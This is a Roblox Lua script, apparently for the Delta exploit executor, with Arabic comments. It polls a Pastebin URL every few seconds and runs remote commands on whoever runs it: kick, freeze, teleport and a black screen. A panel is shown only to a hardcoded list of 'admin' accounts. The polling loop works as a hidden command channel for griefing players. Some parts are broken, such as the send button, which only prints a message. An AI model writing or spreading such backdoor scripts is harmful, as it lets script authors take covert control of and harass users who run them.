-- 🚀 Delta Control System v1.0
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local LocalPlayer = Players.LocalPlayer

-- 🔗 ضع رابطك الخام هنا:
local COMMAND_URL = "https://pastebin.com/raw/XXXXXX"

-- الأوامر المدعومة
local Commands = {
    ["kick"] = function(reason)
        LocalPlayer:Kick(reason or "🚫 تم طردك")
    end,
    
    ["طرد"] = function(reason)
        LocalPlayer:Kick(reason or "🚫 تم طردك")
    end,
    
    ["freeze"] = function()
        if LocalPlayer.Character then
            local humanoid = LocalPlayer.Character:FindFirstChild("Humanoid")
            local root = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
            if humanoid then humanoid.WalkSpeed = 0 end
            if root then root.Anchored = true end
        end
    end,
    
    ["تجميد"] = function() Commands["freeze"]() end,
    
    ["unfreeze"] = function()
        if LocalPlayer.Character then
            local humanoid = LocalPlayer.Character:FindFirstChild("Humanoid")
            local root = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
            if humanoid then humanoid.WalkSpeed = 16 end
            if root then root.Anchored = false end
        end
    end,
    
    ["ايقاف تجميد"] = function() Commands["unfreeze"]() end,
    
    ["bring"] = function()
        if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
            LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0, 100, 0)
        end
    end,
    
    ["سحب"] = function() Commands["bring"]() end,
    
    ["black"] = function()
        local gui = Instance.new("ScreenGui")
        gui.Name = "BlackScreen"
        local frame = Instance.new("Frame")
        frame.Size = UDim2.new(1, 0, 1, 0)
        frame.BackgroundColor3 = Color3.new(0, 0, 0)
        frame.Parent = gui
        gui.Parent = game.CoreGui
    end,
    
    ["شاشه سوداء"] = function() Commands["black"]() end,
    
    ["unblack"] = function()
        local blackScreen = game.CoreGui:FindFirstChild("BlackScreen")
        if blackScreen then blackScreen:Destroy() end
    end,
    
    ["ايقاف الشاشه"] = function() Commands["unblack"]() end
}

-- تحقق إذا مسؤول
local ADMINS = {"sj3zx", "sj3zxx", "sj3zxxx", "sj3zxxx3"}
local function IsAdmin()
    for _, admin in pairs(ADMINS) do
        if LocalPlayer.Name == admin then
            return true
        end
    end
    return false
end

-- تخزين بيانات اللاعبين
local _G = getgenv and getgenv() or _G
_G.DeltaPlayers = _G.DeltaPlayers or {}

-- تحديث بياناتي
spawn(function()
    while task.wait(5) do
        _G.DeltaPlayers[LocalPlayer.Name] = {
            time = os.time(),
            admin = IsAdmin()
        }
    end
end)

-- نظام المراقبة
spawn(function()
    while task.wait(3) do
        pcall(function()
            local text = HttpService:GetAsync(COMMAND_URL)
            local myName = LocalPlayer.Name:lower()
            
            if text:lower():find(myName) then
                for cmd in text:gmatch("%S+") do
                    local cmdFunc = Commands[cmd:lower()]
                    if cmdFunc then
                        cmdFunc()
                        break
                    end
                end
            end
        end)
    end
end)

-- إنشاء الواجهة للمسؤولين
if IsAdmin() then
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "DeltaControl"
    screenGui.Parent = game.CoreGui
    
    -- الإطار الرئيسي
    local mainFrame = Instance.new("Frame")
    mainFrame.Size = UDim2.new(0, 260, 0, 180)
    mainFrame.Position = UDim2.new(0.02, 0, 0.75, 0)
    mainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
    mainFrame.BorderColor3 = Color3.fromRGB(0, 200, 0)
    mainFrame.BorderSizePixel = 2
    mainFrame.Active = true
    mainFrame.Draggable = true
    mainFrame.Parent = screenGui
    
    -- العنوان
    local title = Instance.new("TextLabel")
    title.Size = UDim2.new(1, 0, 0, 30)
    title.BackgroundColor3 = Color3.fromRGB(0, 100, 0)
    title.Text = "👑 Delta Control"
    title.TextColor3 = Color3.new(1, 1, 1)
    title.Font = Enum.Font.GothamBold
    title.Parent = mainFrame
    
    -- عدد اللاعبين
    local playerCount = Instance.new("TextLabel")
    playerCount.Size = UDim2.new(0.9, 0, 0, 30)
    playerCount.Position = UDim2.new(0.05, 0, 0.2, 0)
    playerCount.Text = "👥 اللاعبون: 0"
    playerCount.TextColor3 = Color3.new(0, 1, 0)
    playerCount.BackgroundTransparency = 1
    playerCount.TextXAlignment = Enum.TextXAlignment.Left
    playerCount.Parent = mainFrame
    
    -- حقل كتابة الأمر
    local commandInput = Instance.new("TextBox")
    commandInput.Size = UDim2.new(0.9, 0, 0, 35)
    commandInput.Position = UDim2.new(0.05, 0, 0.45, 0)
    commandInput.PlaceholderText = "اكتب: لاعب أمر"
    commandInput.Text = ""
    commandInput.TextColor3 = Color3.new(1, 1, 1)
    commandInput.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
    commandInput.Parent = mainFrame
    
    -- زر الإرسال
    local sendButton = Instance.new("TextButton")
    sendButton.Size = UDim2.new(0.4, 0, 0, 30)
    sendButton.Position = UDim2.new(0.05, 0, 0.75, 0)
    sendButton.Text = "🚀 إرسال"
    sendButton.BackgroundColor3 = Color3.fromRGB(0, 150, 0)
    sendButton.TextColor3 = Color3.new(1, 1, 1)
    sendButton.Parent = mainFrame
    
    -- حالة النظام
    local status = Instance.new("TextLabel")
    status.Size = UDim2.new(0.5, 0, 0, 20)
    status.Position = UDim2.new(0.5, 0, 0.75, 0)
    status.Text = "⚡ نشط"
    status.TextColor3 = Color3.new(0, 1, 0)
    status.BackgroundTransparency = 1
    status.Parent = mainFrame
    
    -- تحديث عدد اللاعبين
    local function UpdatePlayerCount()
        local count = 0
        for playerName, data in pairs(_G.DeltaPlayers) do
            if os.time() - data.time < 30 then
                count = count + 1
            end
        end
        playerCount.Text = "👥 اللاعبون: " .. count
    end
    
    -- زر الإرسال
    sendButton.MouseButton1Click:Connect(function()
        local text = commandInput.Text
        if text ~= "" then
            status.Text = "📤 جاري..."
            commandInput.Text = ""
            
            -- هنا راح تحتاج تروح للرابط وتكتب الأمر يدوياً
            print("📝 اذهب للرابط وأكتب: " .. text)
            
            task.wait(1)
            status.Text = "✅ أرسل"
            task.wait(2)
            status.Text = "⚡ نشط"
        end
    end)
    
    -- تحديث تلقائي
    spawn(function()
        while task.wait(5) do
            UpdatePlayerCount()
        end
    end)
    
    print("✅ واجهة التحكم جاهزة!")
else
    print("🔒 النظام يعمل في الخلفية")
end

print("🎮 Delta Control - جاهز!")
